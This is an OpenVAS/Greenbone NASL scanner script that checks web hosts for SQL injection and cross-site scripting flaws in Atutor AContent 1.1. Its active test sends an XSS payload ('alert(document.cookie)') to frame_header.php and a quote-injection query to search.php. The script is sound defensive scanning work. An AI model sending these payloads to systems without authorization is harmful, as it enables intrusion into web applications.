if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.801985" );
	script_version( "2021-08-17T16:54:04+0000" );
	script_tag( name: "last_modification", value: "2021-08-17 16:54:04 +0000 (Tue, 17 Aug 2021)" );
	script_tag( name: "creation_date", value: "2011-09-14 16:05:49 +0200 (Wed, 14 Sep 2011)" );
	script_bugtraq_id( 49066 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "Atutor AContent Multiple SQL Injection and XSS Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/17629/" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/103761/ZSL-2011-5033.txt" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/103760/ZSL-2011-5032.txt" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/103759/ZSL-2011-5031.txt" );
	script_tag( name: "impact", value: "Successful exploitation will let attackers to execute arbitrary
  script code or to compromise the application, access or modify data, or exploit
  latent vulnerabilities in the underlying database." );
	script_tag( name: "affected", value: "Atutor AContent version 1.1 (build r296)." );
	script_tag( name: "insight", value: "Multiple flaws are due to an:

  - Input passed via multiple parameters in multiple scripts is not properly
  sanitised before being used in SQL queries.

  - Input passed via multiple parameters in multiple scripts via GET and POST
  method is not properly sanitised before being used." );
	script_tag( name: "solution", value: "Upgrade to Atutor AContent version 1.2 or later." );
	script_tag( name: "summary", value: "This host is running Atutor AContent and is prone to multiple
  cross site scripting and SQL injection vulnerabilities." );
	script_tag( name: "qod_type", value: "remote_active" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://www.atutor.ca" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/", "/AContent", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/home/index.php";
	res = http_get_cache( item: url, port: port );
	if(res && ContainsString( res, ">AContent Handbook<" ) && ContainsString( res, ">AContent</" )){
		url = dir + "/documentation/frame_header.php?p=\"><script>alert(document.cookie)</script>";
		req = http_get( item: url, port: port );
		res = http_keepalive_send_recv( port: port, data: req );
		if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, "\"><script>alert(document.cookie)</script>" )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
		url = dir + "/documentation/search.php?p=home&query='111&search=Search";
		req = http_get( item: url, port: port );
		res = http_keepalive_send_recv( port: port, data: req );
		if(ContainsString( res, "You have an error in your SQL syntax;" )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

